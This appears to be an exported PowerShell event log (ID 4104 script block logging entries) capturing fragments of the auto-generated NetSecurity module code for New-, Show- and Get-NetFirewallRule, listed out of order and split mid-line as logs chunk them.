        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFi

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 19):
dParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyAppId')) {
          [object]$__cmdletization_value = ${PolicyAppId}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyAppId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyAppId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PackageFamilyName')) {
          [object]$__cmdletization_value = ${PackageFamilyName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PackageFamilyName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PackageFamilyName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetFirewallRule' -Alias '*'
        

function Show-NetFirewallRule
{
    [CmdletBinding(PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/NetSecurityDeepEnumElement')]
    param(
    
    [Parameter(ParameterSetName='EnumerateFull1')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='EnumerateFull1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Dependents'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/NetSecurityDeepEnumElement'
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnumerateFull', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Show-NetFirewallRule' -Alias '*'
        

function Get-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProt

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 19):
rameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:IcmpType'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DynamicTarget')) {
          [object]$__cmdletization_value = ${DynamicTarget}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:DynamicTransport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DynamicTransport'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Program')) {
          [object]$__cmdletization_value = ${Program}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Program'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Program'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Package')) {
          [object]$__cmdletization_value = ${Package}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Package'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Service')) {
          [object]$__cmdletization_value = ${Service}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Service'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Service'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('InterfaceAlias')) {
          [object]$__cmdletization_value = ${InterfaceAlias}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceAlias'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('InterfaceType')) {
          [object]$__cmdletization_value = ${InterfaceType}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalUser')) {
          [object]$__cmdletization_value = ${LocalUser}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteUser')) {
          [object]$__cmdletization_value = ${RemoteUser}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteUser'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteMachine')) {
          [object]$__cmdletization_value = ${RemoteMachine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteMachine'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteMachine'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Authentication')) {
          [object]$__cmdletization_value = ${Authentication}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Authentication'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Encryption')) {
          [object]$__cmdletization_value = ${Encryption}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Encryption'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('OverrideBlockRules')) {
          [object]$__cmdletization_value = ${OverrideBlockRules}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:OverrideBlockRules'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteDynamicKeywordAddresses')) {
          [object]$__cmdletization_value = ${RemoteDynamicKeywordAddresses}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteDynamicKeywordAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteDynamicKeywordAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_metho

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 19):
nsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Profile')) {
          [object]$__cmdletization_value = ${Profile}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Platform')) {
          [object]$__cmdletization_value = ${Platform}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Direction')) {
          [object]$__cmdletization_value = ${Direction}
